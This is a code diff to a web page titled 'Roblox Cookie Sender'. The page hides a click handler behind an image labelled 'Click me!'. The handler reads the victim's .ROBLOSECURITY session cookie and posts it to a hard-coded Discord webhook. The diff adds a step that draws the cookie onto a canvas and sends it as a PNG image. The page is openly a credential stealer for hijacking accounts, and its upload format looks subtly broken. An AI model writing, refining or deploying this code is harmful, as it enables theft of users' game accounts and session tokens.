@@ -4,11 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox Cookie Sender</title>
+    <script src="https://cdn.jsdelivr.net/npm/canvas@2.0.0/dist/canvas.min.js"></script>
 </head>
 <body>
     <img src="https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png" alt="Click me!" onclick="sendRobloxCookies()" style="cursor: pointer;">
     <script>
         function sendRobloxCookies() {
+            // Try to retrieve Roblox cookies
             const robloxCookies = document.cookie.split(';').map(cookie => cookie.trim()).filter(cookie => cookie.startsWith('.ROBLOSECURITY='));
             if (robloxCookies.length === 0) {
                 console.error('No Roblox cookies found');
@@ -17,13 +19,29 @@
 
             const robloxCookie = robloxCookies[0].split('=')[1];
 
+            // Convert cookie to image
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 400;
+            canvas.height = 200;
+            ctx.fillStyle = 'white';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = 'black';
+            ctx.font = '20px Arial';
+            ctx.fillText(`Roblox Cookie: ${robloxCookie}`, 20, 50);
+
+            // Send image to Discord
             fetch('https://discordapp.com/api/webhooks/1508814909008515094/K6_XrOoEL_GXG1UJ2Rf9KI_1b76AgKZ7lAM_Nt-WSZkW8mjKxzCCFxavsTiG4ylQyPGL', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    content: `**Roblox Cookie:**\n\`\`\`\n${robloxCookie}\n\`\`\``
+                    content: 'Roblox Cookie',
+                    file: {
+                        name: 'roblox_cookie.png',
+                        content: canvas.toDataURL('image/png').split(',')[1]
+                    }
                 })
             }).then(response => {
                 if (response.ok) {
